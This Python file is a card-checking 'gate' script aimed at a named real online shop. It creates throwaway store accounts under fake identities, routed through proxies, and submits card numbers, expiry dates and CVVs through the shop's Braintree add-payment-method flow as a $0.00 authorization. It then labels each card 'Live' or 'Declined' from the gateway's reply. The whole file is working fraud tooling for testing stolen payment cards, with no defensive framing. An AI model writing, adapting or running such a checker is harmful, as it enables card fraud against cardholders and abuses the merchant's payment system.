"""
Mass3 Gate Engine - WooCommerce Braintree $0.00 Add Payment Method Auth
Target: shop.bullfrogspas.com
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import requests
import time
import json
import random
import re
import base64
import uuid

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _parse_between(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

def get_card_brand_code(cc):
    cc = str(cc).strip()
    if cc.startswith('4'):
        return 'visa'
    elif cc.startswith(('51', '52', '53', '54', '55')) or (len(cc) >= 2 and 22 <= int(cc[:2]) <= 27):
        return 'master-card'
    elif cc.startswith(('34', '37')):
        return 'american-express'
    elif cc.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
        return 'discover'
    return 'visa'

def check_card_mass3_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    proxy_formatted = _format_proxy(proxy_url)
    proxies = {"http": proxy_formatted, "https": proxy_formatted} if proxy_formatted else None

    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)
    card_type = get_card_brand_code(cc)

    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}{random.randint(1000,9999)}@gmail.com"

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })

    try:
        # 1. Fetch Register Nonce from My Account
        r1 = s.get('https://shop.bullfrogspas.com/my-account/', proxies=proxies, timeout=15)
        nonce_reg = _parse_between(r1.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')
        if not nonce_reg:
            nonce_reg = _parse_between(r1.text, 'name="woocommerce-register-nonce" value="', '"')
        if not nonce_reg:
            return False, "Error! ⚠️", f"Failed to get registration nonce (HTTP {r1.status_code})", r1.text[:200]

        # 2. Register User
        data_reg = {
            'username': f"{first}{random.randint(1000,9999)}",
            'email': email,
            'password': f"BuggzPass{random.randint(1000,9999)}!$",
            'woocommerce-register-nonce': nonce_reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        r2 = s.post('https://shop.bullfrogspas.com/my-account/', data=data_reg, proxies=proxies, timeout=15)

        # 3. Get Add Payment Method page & client_token_nonce
        r3 = s.get('https://shop.bullfrogspas.com/my-account/add-payment-method/', proxies=proxies, timeout=15)
        add_pm_nonce = _parse_between(r3.text, 'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
        client_token_nonce = _parse_between(r3.text, '"credit_card","client_token_nonce":"', '"')
        if not client_token_nonce:
            client_token_nonce = _parse_between(r3.text, '"client_token_nonce":"', '"')

        if not client_token_nonce:
            return False, "Error! ⚠️", "client_token_nonce not found on add-payment-method page", r3.text[:200]

        # 4. Fetch Braintree Client Token
        headers_ajax = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://shop.bullfrogspas.com',
            'Referer': 'https://shop.bullfrogspas.com/my-account/add-payment-method/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        data_ajax = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce
        }
        r4 = s.post('https://shop.bullfrogspas.com/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxies=proxies, timeout=15)
        raw_b64 = _parse_between(r4.text, '"data":"', '"')
        if not raw_b64:
            return False, "Error! ⚠️", "Failed to retrieve Braintree authorization fingerprint", r4.text[:200]

        decoded = base64.b64decode(raw_b64).decode('utf-8')
        auth_fingerprint = _parse_between(decoded, '"authorizationFingerprint":"', '"')
        if not auth_fingerprint:
            return False, "Error! ⚠️", "Failed to decode Braintree authorization fingerprint", decoded[:200]

        # 5. Tokenize Card on Braintree GraphQL
        gql_headers = {
            'Accept': '*/*',
            'Authorization': f'Bearer {auth_fingerprint}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
        }
        gql_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        r5 = requests.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload, timeout=15)
        gql_res = r5.json()
        token = (gql_res.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
        if not token:
            err_msg = (gql_res.get("errors") or [{}])[0].get("message", "Braintree Card Tokenization Failed")
            return False, "DECLINED ❌", err_msg, json.dumps(gql_res)

        # 6. Execute WooCommerce Add Payment Method ($0.00 Auth hold)
        device_corr = str(uuid.uuid4()).replace("-", "")
        data_add = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_type,
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': f'{{"correlation_id":"{device_corr}"}}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_pm_nonce if add_pm_nonce else '',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1'
        }
        headers_final = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://shop.bullfrogspas.com',
            'Referer': 'https://shop.bullfrogspas.com/my-account/add-payment-method/',
        }
        r6 = s.post('https://shop.bullfrogspas.com/my-account/add-payment-method/', headers=headers_final, data=data_add, proxies=proxies, timeout=20)
        final_html = r6.text

        # 7. Classify Card Response
        err_box = _parse_between(final_html, '<ul class="woocommerce-error" role="alert">', '</ul>')
        err_text = re.sub(r'<[^>]+>', ' ', err_box).strip() if err_box else ""

        if any(k in final_html for k in ["Payment method successfully added", "New payment method added", "Duplicate card exists in the vault"]):
            return True, "Approved ✅", "Payment method successfully added (0.00 Auth Live)", final_html
        elif "Gateway Rejected: cvv" in final_html or "Card Issuer Declined CVV" in final_html:
            return True, "Approved! CNN 🟩", "Gateway Rejected: cvv (CCN Live)", final_html
        elif "Gateway Rejected: avs" in final_html or "Gateway Rejected: avs_and_cvv" in final_html:
            return True, "Approved! 🟩", "Gateway Rejected: AVS (Card Live)", final_html
        elif "Insufficient Funds" in final_html:
            return True, "Approved! 🟩", "Insufficient Funds (Card Live)", final_html
        elif "Do Not Honor" in final_html or "do_not_honor" in final_html:
            return False, "DECLINED 🔴", "Do Not Honor (Declined by Issuer)", final_html
        elif "Processor Declined" in final_html:
            return False, "DECLINED 🔴", err_text if err_text else "Processor Declined", final_html
        else:
            return False, "DECLINED 🔴", err_text if err_text else "Card Declined", final_html

    except Exception as e:
        return False, "ERROR ⚠️", str(e), ""

async def check_card_mass3(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    return await asyncio.to_thread(check_card_mass3_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
